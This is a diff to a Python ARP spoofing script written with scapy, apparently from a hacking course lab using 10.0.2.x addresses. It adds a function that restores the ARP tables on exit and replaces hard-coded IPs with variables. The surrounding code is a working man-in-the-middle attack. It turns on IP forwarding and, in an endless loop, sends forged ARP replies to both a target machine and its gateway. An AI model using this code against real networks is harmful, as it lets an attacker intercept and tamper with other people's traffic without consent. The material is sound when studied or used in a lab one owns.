@@ -18,14 +18,26 @@ def spoof(target_ip, spoof_ip):
     packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
     scapy.send(packet, verbose=False)
 
+def restore(destination_ip, source_ip):
+    destination_mac = get_mac(destination_ip)
+    source_mac = get_mac(source_ip)
+    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
+    #print(packet.show())
+    #print(packet.summary())
+    #sending packet 4x to clear ARP table
+    scapy.send(packet, count=4, verbose=False)
+
 os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
 
 sent_packets_count = 0
 
+target_ip = "10.0.2.4"
+gateway_ip = "10.0.2.1"
+
 try:
     while True:
-        spoof("10.0.2.4", "10.0.2.1")
-        spoof("10.0.2.1", "10.0.2.4")
+        spoof(target_ip, gateway_ip)
+        spoof(gateway_ip, target_ip)
         sent_packets_count = sent_packets_count + 2
         #the comma adds stuff to the buffer and not adding a new line
         #and printing as a dynamic counter
@@ -34,4 +46,6 @@ try:
         sys.stdout.flush()
         time.sleep(2)
 except KeyboardInterrupt:
-        print("[+] Detected CTRL + C ............ Quitting.")
+        print("\n[+] Detected CTRL + C ............ Resetting ARP tables ............ Please wait.\n")
+        restore(target_ip, gateway_ip)
+        restore(gateway_ip, target_ip)
